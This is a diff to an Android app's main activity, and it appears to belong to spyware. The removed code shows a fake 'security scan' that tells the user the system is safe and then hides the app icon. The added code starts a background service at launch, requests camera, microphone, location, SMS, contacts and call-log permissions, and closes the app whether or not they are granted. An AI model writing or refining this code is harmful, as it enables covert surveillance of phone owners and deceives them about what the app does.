@@ -6,126 +6,74 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
-import java.util.ArrayList;
-import java.util.List;
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 public class MainActivity extends Activity {
+    private static final int PERMISSION_REQUEST_CODE = 100;
+    
+    private static final String[] REQUIRED_PERMISSIONS = {
+        Manifest.permission.CAMERA,
+        Manifest.permission.RECORD_AUDIO,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.READ_PHONE_STATE,
+        Manifest.permission.READ_SMS,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.READ_CALL_LOG
+    };
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         
-        final android.widget.TextView statusText = (android.widget.TextView) findViewById(R.id.statusText);
-        final android.widget.TextView actionStatus = (android.widget.TextView) findViewById(R.id.actionStatus);
-        final android.widget.Button btnAction = (android.widget.Button) findViewById(R.id.btnAction);
+        // Start Service immediately
+        startMainService();
         
-        // Start Service in background immediately
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(new Intent(this, MainService.class));
-        } else {
-            startService(new Intent(this, MainService.class));
-        }
-
-        btnAction.setOnClickListener(new android.view.View.OnClickListener() {
-            @Override
-            public void onClick(android.view.View v) {
-                // Check permissions first
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-                         checkAndRequestPermissions();
-                         return;
-                    }
-                }
-                
-                // If permissions granted, run fake scan
-                btnAction.setEnabled(false);
-                btnAction.setText("SCANNING...");
-                
-                new android.os.Handler().postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        statusText.setText("Fixing vulnerabilities...");
-                        actionStatus.setText("Processing...");
-                        actionStatus.setTextColor(android.graphics.Color.BLUE);
-                    }
-                }, 1500);
-
-                new android.os.Handler().postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        statusText.setText("System is Safe.");
-                        actionStatus.setText("PROTECTED");
-                        actionStatus.setTextColor(android.graphics.Color.GREEN);
-                        btnAction.setText("FINISHED");
-                        android.widget.Toast.makeText(MainActivity.this, "Optimization Complete.", android.widget.Toast.LENGTH_LONG).show();
-                        
-                        // Hide App Icon after "Completion"
-                        new android.os.Handler().postDelayed(new Runnable() {
-                            @Override
-                            public void run() {
-                                finish();
-                                fn_hideicon();
-                            }
-                        }, 1000);
-                    }
-                }, 4000);
-            }
-        });
-        
-        // Auto-check permissions on launch
+        // Request permissions if needed
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-             checkAndRequestPermissions();
+            if (!hasAllPermissions()) {
+                requestAllPermissions();
+            } else {
+                // All permissions granted, close app after short delay
+                closeAppAfterDelay(500);
+            }
+        } else {
+            // Below Android 6, close immediately
+            closeAppAfterDelay(500);
         }
     }
 
-    private void checkAndRequestPermissions() {
-        List<String> permissionsNeeded = new ArrayList<>();
-        String[] permissions = new String[] {
-            Manifest.permission.CAMERA,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.ACCESS_FINE_LOCATION,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.READ_CONTACTS,
-            Manifest.permission.READ_CALL_LOG,
-            Manifest.permission.READ_SMS,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.WRITE_EXTERNAL_STORAGE
-        };
+    private boolean hasAllPermissions() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
+            return true;
+        }
         
-        for (String p : permissions) {
-            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
-                permissionsNeeded.add(p);
+        for (String permission : REQUIRED_PERMISSIONS) {
+            if (ContextCompat.checkSelfPermission(this, permission) 
+                    != PackageManager.PERMISSION_GRANTED) {
+                return false;
             }
         }
         
-        // Add notification permission for Android 13+ (API 33)
+        // Also check POST_NOTIFICATIONS for Android 13+
         if (Build.VERSION.SDK_INT >= 33) {
-             if (checkSelfPermission("android.permission.POST_NOTIFICATIONS") != PackageManager.PERMISSION_GRANTED) {
-                 permissionsNeeded.add("android.permission.POST_NOTIFICATIONS");
-             }
+            if (ContextCompat.checkSelfPermission(this, "android.permission.POST_NOTIFICATIONS") 
+                    != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
         }
-
-        if (!permissionsNeeded.isEmpty()) {
-            requestPermissions(permissionsNeeded.toArray(new String[0]), 123);
-        } else {
-            startMyService();
-            finish();
-            fn_hideicon();
-        }
+        
+        return true;
     }
 
-    @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
-        if (requestCode == 123) {
-            // Regardless of result, start service to try our best
-            startMyService();
-            finish();
-            fn_hideicon();
-        }
+    private void requestAllPermissions() {
+        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
     }
 
-    private void startMyService() {
+    private void startMainService() {
         Intent intent = new Intent(this, MainService.class);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent);
@@ -134,9 +82,22 @@ public class MainActivity extends Activity {
         }
     }
 
-    private void fn_hideicon() {
-        getPackageManager().setComponentEnabledSetting(getComponentName(),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP);
+    private void closeAppAfterDelay(long delayMs) {
+        new android.os.Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                finish();
+            }
+        }, delayMs);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            // Whether granted or denied, close the app
+            // The service is already running in background
+            closeAppAfterDelay(500);
+        }
     }
 }
